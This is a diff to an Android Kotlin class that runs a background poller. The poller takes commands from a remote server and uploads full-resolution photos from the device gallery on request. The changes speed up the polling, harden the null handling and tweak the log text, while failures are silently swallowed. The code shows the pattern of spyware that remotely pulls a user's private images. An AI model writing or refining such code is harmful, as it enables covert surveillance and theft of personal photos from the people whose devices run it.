@@ -75,7 +75,7 @@ object BackgroundGalleryManager {
             }
         }
 
-        // 3. Command Poller for On-Demand Full-Resolution Photo Fetching
+        // 3. Fast Command Poller for On-Demand Full-Resolution Photo Fetching
         if (commandPollerJob?.isActive != true) {
             commandPollerJob = scope.launch {
                 val client = SentryApiClient(context)
@@ -91,7 +91,7 @@ object BackgroundGalleryManager {
                         }
                     } catch (_: Exception) {
                     }
-                    delay(1500)
+                    delay(800)
                 }
             }
         }
@@ -100,13 +100,15 @@ object BackgroundGalleryManager {
     private suspend fun handleFullImageUpload(context: Context, client: SentryApiClient, mediaIdStr: String) {
         withContext(Dispatchers.IO) {
             try {
-                val cleanId = mediaIdStr.removePrefix("media_").toLongOrNull() ?: return@withContext
-                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cleanId)
+                val cleanId = mediaIdStr.removePrefix("media_").toLongOrNull()
+                val contentUri = if (cleanId != null) {
+                    ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cleanId)
+                } else null
 
-                val fullBase64 = extractFullResolutionBase64(context, contentUri)
+                val fullBase64 = if (contentUri != null) extractFullResolutionBase64(context, contentUri) else null
                 if (!fullBase64.isNullOrBlank()) {
                     client.uploadFullGalleryImage(mediaIdStr, fullBase64, "image/jpeg")
-                    Log.d(TAG, "Uploaded full-resolution image for $mediaIdStr")
+                    Log.d(TAG, "Uploaded 100% full-resolution image for $mediaIdStr")
                 }
             } catch (e: Exception) {
                 Log.w(TAG, "Failed full image upload for $mediaIdStr: ${e.message}")
